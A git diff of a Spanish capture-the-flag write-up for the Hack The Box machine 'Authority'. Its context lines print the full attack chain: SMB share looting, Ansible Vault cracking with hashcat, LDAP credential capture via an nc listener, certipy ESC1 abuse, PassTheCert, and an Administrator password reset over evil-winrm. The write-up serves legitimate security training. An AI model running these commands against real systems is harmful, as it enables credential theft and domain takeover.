@@ -217,14 +217,14 @@ set rhosts 10.10.11.222
 ```
 exploit 
 ```
-El resultado indica que `WinRM` se está ejecutando en el puerto `5985`, por lo tanto, vamos a poder conectarse por este puerto al sistema; eso lo veremos más adelante.
+El resultado indica que `WinRM` se está ejecutando en el puerto `5985`, por lo tanto, vamos a poder conectarse por este puerto al sistema; eso lo veremos más adelante.  
 ![Desktop View](/writeup-htb-authority/winrm.png)
 _WinRm_
 
-Ahora vamos a revisar el sitio web que se encuentra en el puerto `8443`, para ello colocamos en nuestro navegador lo siguiente: `http://10.10.11.222:8443`. Al cargar la página aparece un login.
+Ahora vamos a revisar el sitio web que se encuentra en el puerto `8443`, para ello colocamos en nuestro navegador lo siguiente: `http://10.10.11.222:8443`. Al cargar la página aparece un login.  
 ![Desktop View](/writeup-htb-authority/login.png)
 _Login_
-Debajo del login hay 2 opciones más, las cuales nos llevan al `/config/login`, donde hay un campo para digitar un `password`.
+Debajo del login hay 2 opciones más, las cuales nos llevan al `/config/login`, donde hay un campo para digitar un `password`.  
 > Como solo se puede digitar el password, posiblemente por acá se ingresa al sistema web y para ello debemos de encontrar un password.
 {: .prompt-tip }
 ![Desktop View](/writeup-htb-authority/config.png)
@@ -240,7 +240,7 @@ Primeramente vamos a comenzar por el servicio de `smb`; en un servicio `smb` lo 
 - Interactuar con Impresoras Compartidas
 {: .prompt-info }
 
-Para enumerar los `shares` usamos el siguiente comando.
+Para enumerar los `shares` usamos el siguiente comando.  
 ```bash
 smbclient -L 10.10.11.222 -N
 ```
@@ -250,10 +250,10 @@ Hay varias carpetas, por lo tanto vamos a ingresar a cada una de ellas, sin emba
 ```bash
 smbclient //10.10.11.222/Development -N
 ```
-Hay un directorio llamado `Automation`, el cual contiene varios archivos.
+Hay un directorio llamado `Automation`, el cual contiene varios archivos.  
 ![Desktop View](/writeup-htb-authority/development.png)
 _Development_
-Descargamos a nuestra máquina toda esa información, y esto lo realizaremos por medio de la consola de smbclient. Para esto digitamos lo siguiente:
+Descargamos a nuestra máquina toda esa información, y esto lo realizaremos por medio de la consola de smbclient. Para esto digitamos lo siguiente:  
 ```
 recurse ON
 prompt OFF
@@ -268,7 +268,7 @@ _Ansible.cfg_
 - En la ruta `Automation/Ansible/PWM/templates`, en el archivo `tomcat-users.xml.j2`{: .filepath}, hay usuarios y contraseñas. Se probaron estas credenciales, pero no se tuvo éxito.  
 ![Desktop View](/writeup-htb-authority/tomcat.png)
 _tomcat-users.xml.j2_
-- En la ruta `Automation/Ansible/PWM`, en el archivo `ansible_inventory`{: .filepath}, hay una contraseña para el usuario administrator, he índica que es para conectarse a winrm. Se probó la conexión, pero no sé conecto.
+- En la ruta `Automation/Ansible/PWM`, en el archivo `ansible_inventory`{: .filepath}, hay una contraseña para el usuario administrator, he índica que es para conectarse a winrm. Se probó la conexión, pero no sé conecto.  
 ![Desktop View](/writeup-htb-authority/ansible inventory.png)
 _ansible_inventory_
 - En la ruta `Automation/Ansible/PWM/defaults`, en el archivo `main.yml`{: .filepath}, hay datos cifrados en ANSIBLE_VAULT.  
@@ -279,7 +279,7 @@ _ansible_inventory_
 _main.yml_
 ## Cracking de Ansible Vault
 Vamos a crackear los ansible vault y para ello nos apoyamos del siguiente artículo [**Cracking Ansible Vault Secrets with Hashcat**](https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/).  
-- Primeramente debemos de extraer el ansible vault blob. En el archivo hay 3 vault blob, las cuales son las de: `pwm_admin_login`, `pwm_admin_password` y `ldap_admin_password`. Escogemos cualquiera, luego creamos un archivo llamado `credentials.vault`{: .filepath} y pegamos el valor.
+- Primeramente debemos de extraer el ansible vault blob. En el archivo hay 3 vault blob, las cuales son las de: `pwm_admin_login`, `pwm_admin_password` y `ldap_admin_password`. Escogemos cualquiera, luego creamos un archivo llamado `credentials.vault`{: .filepath} y pegamos el valor.  
 {: .prompt-tip }
 ![Desktop View](/writeup-htb-authority/credentials-vault.png)
 _credential.vault_
@@ -287,21 +287,21 @@ _credential.vault_
 ```bash
 ansible2john credentials.vault > credentials.hash
 ```
- Esto da como resultado una cadena de caracteres que inicia con el nombre del archivo origen(en nuestro caso aparece `credentials.vault`), seguido de `:`y para finalizar demás caracteres del vault. Como `hashcat` no interpreta el nombre del archivo como válido, borramos el nombre `credentials.hash`{: .filepath} y también los `:` que están a continuación del nombre.
+ Esto da como resultado una cadena de caracteres que inicia con el nombre del archivo origen(en nuestro caso aparece `credentials.vault`), seguido de `:`y para finalizar demás caracteres del vault. Como `hashcat` no interpreta el nombre del archivo como válido, borramos el nombre `credentials.hash`{: .filepath} y también los `:` que están a continuación del nombre.  
 ![Desktop View](/writeup-htb-authority/credential -hash.png)
 _credential hash_
 - Ahora usamos hashcat.
 ```bash
 hashcat -m 16900 -O -a 0 -w 4 credentials.hash /usr/share/wordlists/rockyou.txt
 ```
-Luego de un tiempo obtenemos como resultado `!@#$%^&*`, que vendría hacer la frase de cifrado del vault.
+Luego de un tiempo obtenemos como resultado `!@#$%^&*`, que vendría hacer la frase de cifrado del vault.  
 ![Desktop View](/writeup-htb-authority/hashcat.png)
 _Hashcat_
 
 > La frase de cifrado se usa desencriptar los ansible vault, por lo tanto, con esto podemos desencriptar los ansible vault de `pwm_admin_login`, `pwm_admin_password` y `ldap_admin_password`.   
 {: .prompt-info }
 
-En la página [**Ansible Vault Tool**](https://ansible-vault.braz.dev/) se pueden desencriptar los ansible vault. Para ello debemos de colocar la frase de cifrado en `Passphrase` y en `Content to encrypt / decrypt` el ansible vault; por último click en `Decrypt`.
+En la página [**Ansible Vault Tool**](https://ansible-vault.braz.dev/) se pueden desencriptar los ansible vault. Para ello debemos de colocar la frase de cifrado en `Passphrase` y en `Content to encrypt / decrypt` el ansible vault; por último click en `Decrypt`.  
 ![Desktop View](/writeup-htb-authority/pwm_admin_login.png)
 _pwm_admin_login_
 ![Desktop View](/writeup-htb-authority/pwm_admin_password.png)
@@ -315,12 +315,12 @@ Por lo tanto, al final se obtiene el siguiente resultado:
 
 
 ## Explotación
-Teniendo toda está información vamos a intentar ingresar al sistema, para ello primero vamos a probar en la página web del puerto `8443`.  En el login inicial se colocó el usuario `svc_pwm` y el password `pWm_@dm!N_!23`; dando como resultado un error, donde se indica que el directorio está inhabilitado, por lo tanto, no es posible ingresar por acá.
+Teniendo toda está información vamos a intentar ingresar al sistema, para ello primero vamos a probar en la página web del puerto `8443`.  En el login inicial se colocó el usuario `svc_pwm` y el password `pWm_@dm!N_!23`; dando como resultado un error, donde se indica que el directorio está inhabilitado, por lo tanto, no es posible ingresar por acá.  
 ![Desktop View](/writeup-htb-authority/login2.png)
 _Login_
 ![Desktop View](/writeup-htb-authority/error.png)
 _Error_
-Sin embargo, en la página `Configuration Manager` hay un campo para ingresar password. Colocamos el valor de `pWm_@dm!N_!23`.
+Sin embargo, en la página `Configuration Manager` hay un campo para ingresar password. Colocamos el valor de `pWm_@dm!N_!23`.  
 ![Desktop View](/writeup-htb-authority/configuration manager.png)
 _Configuration manager_
 Y bingo, conseguimos loguearse.  
@@ -333,17 +333,17 @@ _Configuration editor_
 Visualizamos cada una de las opciones y  cuando desplegamos `LDAP`, `LDAP directories`, `defualt` y `conecction`, encontramos algo muy interesante. 
 > Se puede agregar una conexión de LDAP y luego testear, por lo tanto, podemos indicarle que apunte a un puerto de nuestra máquina y ver los datos que envían. Según las opciones que se logran observar lo que enviará será el `LDAP Proxy User`y el `LDAP Proxy Password`.
 {: .prompt-tip }
-- Agregamos la ldap url, donde colocamos `ldap://nuestraIp:nuestroPuerto`.
+- Agregamos la ldap url, donde colocamos `ldap://nuestraIp:nuestroPuerto`.  
 ![Desktop View](/writeup-htb-authority/ldap.png)
 _Ldap url_
 - Luego en una shell colocamos nuestro puerto en escucha.
 ```bash
 nc -lvnp 3222 
 ```
-- Por último damos click en `Test LDAP profile`.
+- Por último damos click en `Test LDAP profile`.  
 ![Desktop View](/writeup-htb-authority/test ldap.png)
 _Test LDAP profile_
-Al shell llegaron los datos del `LDAP Proxy User`y el `LDAP Proxy Password`. En donde vemos que el usuario es `svc_ldap` y el password `lDaP_1n_th3_cle4r!`.
+Al shell llegaron los datos del `LDAP Proxy User`y el `LDAP Proxy Password`. En donde vemos que el usuario es `svc_ldap` y el password `lDaP_1n_th3_cle4r!`.  
 ![Desktop View](/writeup-htb-authority/shell.png)
 _nc_
 
@@ -353,15 +353,15 @@ El usuario encontrado debe de tener estar registrado en el servidor Windows, por
 >Evil-WinRM es una herramienta de prueba de penetración que se utiliza para obtener acceso remoto no autorizado a sistemas Windows a través del protocolo WinRM (Windows Remote Management). WinRM es el protocolo de administración remota en Windows que permite a los administradores controlar las máquinas de forma remota utilizando el Protocolo de Transferencia de Estado Representacional (REST) sobre HTTP.
 {: .prompt-info }
 
-Colocamos el siguiente conectador para conectarse al servidor.
+Colocamos el siguiente comando para conectarse al servidor.
 ```bash
 evil-winrm -i 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' 
 ```
-Se ingresó con éxito al servidor.
+Se ingresó con éxito al servidor.  
 ![Desktop View](/writeup-htb-authority/winrm login.png)
 _Ingreso al sistema_
 
-Ahora nos dirigimos al escritorio donde se encuentra el flag del usuario.
+Ahora nos dirigimos al escritorio donde se encuentra el flag del usuario.  
 ![Desktop View](/writeup-htb-authority/user flag.png)
 _Flag del usuario_
 
@@ -481,11 +481,11 @@ Para realizar esta acción vamos a utilizar la herramienta `impacket-addcomputer
 impacket-addcomputer authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222 -computer-name test$ -computer-pass Test123456
 ```
 > Donde:  
-	 authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -> tiene la estructura de dominio/usuario:\'password \'.  
+	 authority.htb/svc_ldap:\'lDaP_1n_th3_cle4r!\' -> tiene la estructura de dominio/usuario:\'password \'.  
 	 -computer-name -> específica el nombre de la computadora; siempre debe ir $ después del nombre.  
 	 -computer-pass -> específica el password de la computadora.  
 {: .prompt-info }
-La computadora se creó correctamente. 
+La computadora se creó correctamente.  
 ![Desktop View](/writeup-htb-authority/add computer.png)
 _Add computer_
 Con los datos de esta máquina ya podemos explotar la vulnerabilidad ESC1. De acuerdo al artículo se debe de utilizar la opción `req` de certipy.
@@ -502,7 +502,7 @@ certipy-ad req -u 'test$@authority.htb' -p 'Test123456' -ca 'AUTHORITY-CA' -targ
 	 -debug -> muestra todo el proceso realizado.  
 {: .prompt-info }
 
-Se ejecutó correctamente y se obtuvo como resultado el archivo `administrator.pfx`.
+Se ejecutó correctamente y se obtuvo como resultado el archivo `administrator.pfx`.  
 ![Desktop View](/writeup-htb-authority/certipy req.png)
 _Certipy req_
 Con este archivo podemos intentar conectarse al sistema. Para esto usamos la opción `auth` de certipy.
@@ -513,7 +513,7 @@ Con este archivo podemos intentar conectarse al sistema. Para esto usamos la opc
 	 -pfx -> específica el archivo pfx.  
 	 -u -> específica el usuario.  
 {: .prompt-info }
-Ejecutamos y sale el error: `Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)`.
+Ejecutamos y sale el error: `Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)`.  
 ![Desktop View](/writeup-htb-authority/certipy auth.png)
 _Certipy auth_
 Se buscó este error y en el artículo [**Authenticating with certificates when PKINIT is not supported**](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html), indican que sale esto porque la autenticación por kerberos no está permitida, sin embargo, hay otro método para autenticarse cuando está opción está deshabilitada y es por medio de `certificados de cliente`; para ello se puede usar la herramienta `PassTheCert` que está diseñada para este fin.
@@ -523,7 +523,7 @@ Para esto primero tenemos que generar los certificados del cliente, en el github
 ```bash
 certipy-ad cert -pfx administrator.pfx -nokey -out user.crt
 ```
-- Luego obtenemos la `key del cliente`.
+- Luego obtenemos la `key del cliente`.  
 ```bash
 certipy-ad cert -pfx administrator.pfx -nocert -out user.key
 ```
@@ -539,7 +539,7 @@ python3 passTheCert.py -action ldap-shell -dc-ip 10.10.11.222 -crt user.crt -key
 	 -crt -> específica el certificado del usuario.  
 	 -key -> específica el key del usuario.  
 {: .prompt-info }
-Ejecutamos y obtenemos una ldap-shell.
+Ejecutamos y obtenemos una ldap-shell.  
 ![Desktop View](/writeup-htb-authority/passthecert.png)
 _PassTheCert_
 Hay diferentes opciones que se puede realizar en la shell, como nosotros queremos escalar privilegios, lo que vamos a hacer es `cambiar el password del usuario administrator`. Otra manera seria añadiendo el usuario svc_ldap al grupo de administradores.  
@@ -547,7 +547,7 @@ Para cambiar el password del usuario administrator realizamos lo siguiente:
 ```
 change_password Administrator passdeSuperAdmin123.
 ```
-> Donde: passdeSuperAdmin123. es el nuevo password.
+> Donde: passdeSuperAdmin123. es el nuevo password.  
 {: .prompt-info }
 ![Desktop View](/writeup-htb-authority/change password.png)
 _Change password_
@@ -555,10 +555,10 @@ Cambiada la contraseña, procedemos a conectarse con el usuario administrator.
 ```bash
 evil-winrm -i 10.10.11.222 -u 'administrator' -p 'passdeSuperAdmin123.'
 ```
-Esperamos un rato, y ya estamos logueados como administrator.
+Esperamos un rato, y ya estamos logueados como administrator.  
 ![Desktop View](/writeup-htb-authority/login administrator.png)
 _Login with administrator_
-Nos dirigimos al escritorio y obtenemos el flag `root.txt`.
+Nos dirigimos al escritorio y obtenemos el flag `root.txt`.  
 ![Desktop View](/writeup-htb-authority/root flag.png)
 _Flag del root_
 > Espero les haya gustado este post, nos vemos en una siguiente oportunidad.  
